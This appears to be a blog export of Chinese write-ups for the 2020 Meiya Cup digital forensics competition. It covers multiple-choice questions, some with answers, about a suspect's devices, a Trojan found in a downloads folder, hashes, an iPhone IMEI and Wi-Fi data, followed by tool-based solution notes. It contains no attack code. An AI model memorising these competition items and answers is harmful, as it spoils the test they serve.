<th>A:”<a href="mailto:daniellaw43346@gmail.com">daniellaw43346@gmail.com</a>  - Daniel_Gmail.pst, Paypal updated:New Account update needs to be  noticed”;B:”<a href="mailto:daniellaw43346@gmail.com">daniellaw43346@gmail.com</a> - Daniel_Gmails.pst, Paypal  updated:New Account update needs to be  noticed”;C:”<a href="mailto:daniellaw@gmail.com">daniellaw@gmail.com</a> - Daniel_Gmail.pst, Paypal  updated:New Account update needs to be  noticed”;D:”<a href="mailto:danielaw43346@gmail.com">danielaw43346@gmail.com</a> - Daniel_Gmail.pst, Paypal  updated:New Account update needs to be  noticed”;E:”<a href="mailto:daniellaw43346@yahoo.com">daniellaw43346@yahoo.com</a> - Daniel_Gmail.pst, Paypal updated:New  Account update needs to be noticed”.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026397.png" alt="image-20211029192426214"></p>
<h2 id="131"><a href="#131" class="headerlink" title="131"></a>131</h2><table>
<thead>
<tr>
<th>在Daniel的桌面上发现了甚么恶意软件？(某些字符被刻意用*遮盖)</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:wi<strong>ows.bat;B:ootd-4.0.</strong>2.0.exe;C:7z<strong>00-x64.exe;D:NDP452-KB290</strong>07-x86-x64-AllOS-ENU.exe;E:<strong>deo_view</strong>_3.1.2.4.zip.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>在 windows 默认下载目录找到一些文件<br>全导出后拖进火绒检测可找到</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026399.png" alt="image-20211029194733317"></p>
<h2 id="132"><a href="#132" class="headerlink" title="132"></a>132</h2><table>
<thead>
<tr>
<th>该恶意软件的哈希值（SHA-256）是甚么？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:508972AFE67F7991F13212E1FE517F82BDC032DE0F5CDF15FDF641ED1FDD233D;B:5089E67F7991F13212E1FE517F82BDC032DE0F5CDF15FDF641ED1FDD233D72AF;C:72AFE67F7991F13212E1FE517F82BDC032DE0F5CDF15FDF641ED1FDD233D5089;D:77AFB67F7991F13212E1FE517F82BDC032DE0F5CDF15FDF641ED1FDD233D50B9;E:E67F7991F13212E1FE517F82BDC032DE0F5CDF15FDF641ED1FDD233D508972AF.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026400.png" alt="image-20211029194927635"></p>
<h2 id="133-该恶意软件的功能是甚么？"><a href="#133-该恶意软件的功能是甚么？" class="headerlink" title="133 **该恶意软件的功能是甚么？"></a>133 **该恶意软件的功能是甚么？</h2><table>
<thead>
<tr>
<th>该恶意软件的功能是甚么？</th>
<th>E</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:远程桌面协议;B:作为获得管理员级别访问权限的rootkit;C:作为键盘侧录程序 (Keylogger);D:作为抢夺者 (Snipper);E:作为特洛伊木马 (Trojan Horse).</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026399.png" alt="image-20211029194733317"></p>
<p>拖入微步云沙箱看看高危行为</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026401.png" alt="image-20211029202407134"></p>
<p>提示应该是特洛伊木马</p>
<p>下图从何得出</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026402.png" alt="image-20211030134338858"></p>
<h2 id="134-Daniel的MacBook-计算机的哈希值（SHA-1）是甚么"><a href="#134-Daniel的MacBook-计算机的哈希值（SHA-1）是甚么" class="headerlink" title="134 Daniel的MacBook 计算机的哈希值（SHA-1）是甚么?"></a>134 Daniel的MacBook 计算机的哈希值（SHA-1）是甚么?</h2><table>
<thead>
<tr>
<th>Daniel的MacBook 计算机的哈希值（SHA-1）是甚么?</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:B90D23B13560A619F682DE76991CD768;B:B9OD23B13560A619F682DE76991CO768;C:C71C21730461FC901FD99F76C3679C3FED0DFAB9;D:C77C21730461FC901FD99F76C3679C3FED0DFA89;E:FAB921730461FC901FD99F76C3679C3FED0DC71C.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026403.png" alt="image-20211030134406592"></p>
<h2 id="135"><a href="#135" class="headerlink" title="135"></a>135</h2><table>
<thead>
<tr>
<th>Daniel的MacBook 计算机中有多少个分区？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:2;B:3;C:4;D:5;E:6;</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026404.png" alt="image-20211030134646170"></p>
<h2 id="136-Daniel的iPhone的操作系统是甚么版本？"><a href="#136-Daniel的iPhone的操作系统是甚么版本？" class="headerlink" title="136 Daniel的iPhone的操作系统是甚么版本？"></a>136 Daniel的iPhone的操作系统是甚么版本？</h2><table>
<thead>
<tr>
<th>Daniel的iPhone的操作系统是甚么版本？</th>
<th></th>
<th>1</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>初级</th>
<th>A:12.0.0.1;B:12.3.2;C:12.4.7;D:12.5.1;E:13.4.6.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>版本太老了，不匹配，</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026405.png" alt="image-20211102141740796"></p>
<p>应该改成Bob这样的iPhone备份格式</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026406.png" alt="image-20211102141835341"></p>
<p>无法使用手机大师取出东西，可以使用脚本修改为常见iPhone格式，要不就手动寻找</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026407.png" alt="image-20211030135158690"></p>
<h2 id="137"><a href="#137" class="headerlink" title="137"></a>137</h2><table>
<thead>
<tr>
<th>Daniel的iPhone的wifi mac地址是甚么？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:22:9a:be:c4:99:7b;B:44:9a:be:c4:99:7d;C:50:9a:be:c9:99:7d;D:64:9a:be:c4:99:7d;E:7d:64:9a:be:c4:99.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>lockdown文件夹下的device_values.plist</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026408.png" alt="image-20211030134957485"></p>
<h2 id="138"><a href="#138" class="headerlink" title="138"></a>138</h2><table>
<thead>
<tr>
<th>Daniel的iPhone的IMEI是甚么？</th>
<th>D</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:256960065058545;B:300960065055854;C:359000065055845;D:356960065055845;E:456960065505845.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026409.png" alt="image-20211030135100631"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026410.png" alt="image-20211030135708696"></p>
<h2 id="139"><a href="#139" class="headerlink" title="139"></a>139</h2><table>
<thead>
<tr>
<th>iPhone上次连接WIFI的SSID是甚么？</th>
<th></th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:Netgear;B:Netgear_5G;C:Net24-5G;D:Netgear24_4G;E:Netgear24_5G.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>修复后手机大师能看到</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032026411.png" alt="image-20211102144033261"></p>
<h2 id="140"><a href="#140" class="headerlink" title="140"></a>140</h2><table>
<thead>
<tr>
<th>根据调查结果，以下哪项关于Daniel的选项是正确的？</th>
<th>E</th>
<th>2</th>
<th>第六届美亚杯</th>
<th>电子数据取证</th>
<th>单选</th>
<th>中级</th>
<th>A:Daniel 认识 Alice;B:Cole 入侵了 Daniel 的计算机;C:Daniel知情地入侵了Xeno的服务器;D:Daniel是犯罪团伙的一员;E:以上都不对.</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>A Daniel 是cole网上招募到B 入侵zello的 C D 犯罪团伙应该是群里的一员 E</p>
]]></content>
      <categories>
        <category>取证</category>
      </categories>
      <tags>
        <tag>美亚杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2020年“美亚杯”第六届中国电子数据取证大赛个人赛解析</title>
    <url>/20meiyacuppersonal.html</url>
    <content><![CDATA[<h1 id="2020第六届美亚杯中国电子数据取证大赛个人赛-资格赛-writeup"><a href="#2020第六届美亚杯中国电子数据取证大赛个人赛-资格赛-writeup" class="headerlink" title="2020第六届美亚杯中国电子数据取证大赛个人赛(资格赛)writeup"></a>2020第六届美亚杯中国电子数据取证大赛个人赛(资格赛)writeup</h1><p>为了给2021年美亚杯做准备，这几天重新做了一下前几年美亚杯的题目，题量很大，做做复现记录一下。</p>
<p>期待今年的美亚杯</p>
<h2 id="个人赛解题-笔记本"><a href="#个人赛解题-笔记本" class="headerlink" title="个人赛解题-笔记本"></a>个人赛解题-笔记本</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0NfFelespibL6yOatUichwSY6p6oOxcJNUaU0ZteydoaIGprIUOnWFAEQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">img</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0DcfNea2j5NW5UT3ufMAPxvgibYXFibFyKUW8W5mHhvjDCibgUKXkRrxkg/640?wx_fmt=other&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">img</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0Hu1R82hhDVA521JFXs5BQsFb1xQJpNsL8WBCZsJoJxFib6VFhAiae8XA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">img</p>
<h3 id="第1题"><a href="#第1题" class="headerlink" title="第1题"></a>第1题</h3><p>取证大师计算哈希可得sha1，但是<code>e01</code>格式的镜像文件内已经存储了打包镜像时计算的哈希值，我们完全不需要二次计算，只需使用<code>FTK</code>加载镜像，即可看到已经算好的哈希值，秒解</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0ZaAFyOFVziaf6aQnAT9tHfcA99qZLiaSZdJNQQMgz5XGYBUOYia2hG3kg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130200247571</p>
<h3 id="第2到11题"><a href="#第2到11题" class="headerlink" title="第2到11题"></a>第2到11题</h3><p>取证大师即可</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0icpX5GccOC65ibLgJqrjoiaIVNJPXLHibWVXdicl308xTias2qIobHkatwdw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130200720106</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0EFZyXorricsoq3Xpp8kMuxXYflkP45mzgcuGmsSVSgaVmiaqLA55BwKA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130200744183</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0znhAephaRKCbBP0qPgyQjzGicT72CsYlic5sfZOFIYfTriaLv5liaCNIXQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130200823858</p>
<p>ps.</p>
<p>CST指的就是中国标准时间，UTC+8:00</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0ibxpudndXQlnL3Zz1taAicmWE6NrsboXfqIWxia7iaHPqXZ0nXYhicoWgdg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130200943339</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0q2eq3CgszKAWhE7gpLuJ8Ha9lKibVvibzupb3FEbwftThCXmkwbM5tJg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130201037841</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0ibZxjBOTzUI6RmuM6ReFf4OmKYLFqwwsogSOPia8wwBShHFNLibrJcianA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130201104575</p>
<h3 id="第12题"><a href="#第12题" class="headerlink" title="第12题"></a>第12题</h3><p>仿真一下，即可看到</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0GbNzicFQgZadJ0iaWv9BKuibOrYLJoVj19gnWyryYz4BTsxtYBDRMy9fA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130201721195</p>
<p>ps.</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0URInU7Yg2rCUYZItRkibS8eTk9Zjy4Mic4aj23mJ89xLsMJcpuzqtERg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130201221274</p>
<p>这个不支持虚拟化的bug可以用关闭这里的选项解决，去掉这个钩</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0WIgibwAticErKvicwt2ByzjGqiaLibjFibYa5bXzZBib1MCmsR6qbMxOAbLEA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130201318942</p>
<h3 id="第13题"><a href="#第13题" class="headerlink" title="第13题"></a>第13题</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0XKFF4xPYkV1DKpicPCItCuPnhGebZNlMX3Eicib1S8molJa8kn70jic88g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130201430773</p>
<p>看取证大师的搜索记录</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0kteTEjsUG9xZ3NbSEicOS72Jb8D3ia4YdsBztZveI5pGhASw8tBQLnZQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130201628531</p>
<h3 id="第14、15题"><a href="#第14、15题" class="headerlink" title="第14、15题"></a>第14、15题</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0Kq24EXba9YLdJ0I2MKNYXSkmiaicVMpnYibz8s2YrTXDZ42Rt9hjZdAAA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130202009438</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0UOJ4ec0M7OG1JZ6c993v7UnBvia6rqopyu8KFdpicTNzTe3Xp0PZiacqQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130202000886</p>
<p>信用卡小知识：</p>
<blockquote>
<p>信用卡安全码（英文：Card Security Code）是信用卡在进行网络交易和电话交易时的一个安全特征。它通常是印刷在信用卡上面的3或4位数字，用于证实付款人在交易时是拥有信用卡的，从而防止信用卡欺诈。</p>
<p>信用卡的有效期(exp)</p>
<p>填写的格式一般是 月/年 比如说0912 就是有效期到2012年9月</p>
</blockquote>
<h3 id="第16到18题"><a href="#第16到18题" class="headerlink" title="第16到18题"></a>第16到18题</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0tVDWXvxkC57jW2zIzSxb9iaazMqTqia1w3nMKOtrQY1MaR2FcXRCLY5w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130202217228</p>
<blockquote>
<p>小知识</p>
<p>压缩文件的英文是zip</p>
</blockquote>
<p>仿真电脑，在下载目录可以发现同名的</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0XhCaXDtOiaiasgvlH81hdG62qj8Hu8fbboqf77FibywZ0dmgUMiakLicNaw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130202958313</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0jH7pJ3eVXs5YSg8ml59eZ1nGzTy9v5oSLGBB5DGhgicPvOG3vWROOrg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130202932170</p>
<h3 id="第19题"><a href="#第19题" class="headerlink" title="第19题"></a>第19题</h3><p>这一题我是用排除法做的，从u盘里的 <code>System Volume Information</code>创建时间可以看出是2020-09-29-1801</p>
<p>看着就很像</p>
<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片">image-20201130203603513</p>
<h3 id="第20到22题"><a href="#第20到22题" class="headerlink" title="第20到22题"></a>第20到22题</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0yQs21hnta0yzHf3J4VyQP0Oyge411LKeldh1iaBc3EC9VuWfmml6DIA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130203815546</p>
<p>虽然有加密，但是还是能看里面有啥文件</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0NJ9kK47aRLmibGbufZguonBs6n7Pd2zAdbrss0Fnc0RGbib4zdSHxwGA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130203119916</p>
<p>里面的两张图片其实在download目录下有，跟压缩包里的相同，可以算一下crc</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0W2dMIATYEh2wtgibJVb6AogcQreMvNQV6d9Zo3WeqicGfiaaic0NPG4gPQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130204020617</p>
<p>算在外面的图片的哈希即可</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp02NPFJGAvWLJ8AFX7JC1yibeP2Q8B99Kv4K9BCUMgzynNYVufIiahWQGw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130204103376</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp09qQprWXm3da4zHRPrwaTzUh1yl07fkaiaDnHAKJ6iaClwDSWw12f2rDw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130204051529</p>
<h3 id="第23到31题"><a href="#第23到31题" class="headerlink" title="第23到31题"></a>第23到31题</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0q6nLGvtxUnE5UD08MZlk3qcjg1vvibnibMib7EUaia4nia5uEghQ3NLbIKw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130204154538</p>
<p>取证大师即可</p>
<p>版本可以仿真看</p>
<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片">image-20201130204248073</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp07Dtys5FLJKVV50Hxu5ibOCc3nnicrrW4fekPXibPAlUiam4epEnOdw0RLA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">img</p>
<p>取证大师即可</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0COUQP8BsUl3NtZn2KqDZ6QO7To9qib3cjyayYITppI6SCSDFpR8J14w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130204210920</p>
<p>不知道第25和29题，第27和30题之间为啥有重复部分。。</p>
<p>这个第31题，我弄了好久都不知道AP是啥意思</p>
<p>有哪位大佬知道。。。</p>
<h3 id="第32题"><a href="#第32题" class="headerlink" title="第32题"></a>第32题</h3><p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片">image-20201130210239461</p>
<p>找R3ZZ.txt</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp05icmtgBwcqwOTMrEt2tvyY6HWiaRFq5RUfKMVDOAia5l4p6llkMbpiblRw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130210344287</p>
<h3 id="第33、34题"><a href="#第33、34题" class="headerlink" title="第33、34题"></a>第33、34题</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0t3hcn6ZhJBN3Bjmb7f9ZFawGauia9MQWR8DTAWwe6Hd5iaQ5p8uUIwYQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130210403405</p>
<p>看那俩购买发票，就是那俩图</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0Ygh7LcrLBmkbXuuKraiazEyzJ6QpJeTYhbR19P88EVemQOaiaNJKiamMQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130210556035</p>
<p>第34题我是推断的，就是用信用卡买东西需要提供什么信息</p>
<h2 id="个人赛解题-手机"><a href="#个人赛解题-手机" class="headerlink" title="个人赛解题-手机"></a>个人赛解题-手机</h2><h3 id="第35到37题"><a href="#第35到37题" class="headerlink" title="第35到37题"></a>第35到37题</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0xfTe268Y4pUQkRPm44VafSXNcr4ZeEW0LiaYpPHvznmN8GtjhC2WIEg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130211009194</p>
<p>第35题可以从给的案件调查报告里找到</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0kFKBYRBVVQxFvrs4CpfDZicwAq3aPadAXFrZPFDzeD8pqme2Ik5ytsQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130211254522</p>
<p>至于是G3还是G4，emmm，他给的有手机照片，应该能直接看出来，但是我不知道。。。</p>
<p>第36</p>
<h4 id="37题"><a href="#37题" class="headerlink" title="37题*"></a>37题*</h4><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp09RcpbGLguibCWj99sI1VibxibLDicpU6icB5icEV79IicMWiajLbznz6GHT3NQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130211450822</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0RZ9XbLFOnEsqObWvIWY72c0q78S6trUkjYZHIzWPicKoXwtBPUufuuA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130211649419</p>
<h3 id="第38到42题"><a href="#第38到42题" class="headerlink" title="第38到42题"></a>第38到42题</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0ajUfTqzJoj1TCD0WdJOqYCb5ZVzMRxYF61T8KmwtddFwQrT0GwlXmA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">img</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0qyrBHxlevMhDibMEbHoLmiaAyTCbAKX13S9WTiaeL8m1qlusV5w9HbDOA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130211841136</p>
<p>均能用盘古石的手机取证顺利取出</p>
<p>第38</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0QHKSJIEKu3zTVuK7gCsHaDicz3d4BG7A5lhngWztJnkVp5pViaDxVFVw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130211746477</p>
<p>第39</p>
<p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片">image-20201130211944484</p>
<p>第40</p>
<p>导出后再看就好了</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0hlfCicwasZbibflH9ibLiafVbIS8ZcvkdoarQzTPMIS4wDCY3jPEuR668A/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130212143354</p>
<p>第41、42</p>
<p>稍微有点不一样</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0ZMlwrDhpVBnwVzfLbaVg7HeC2xbFAgUXN5mYA62GCbk6D1UhoBeG5w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130212327002</p>
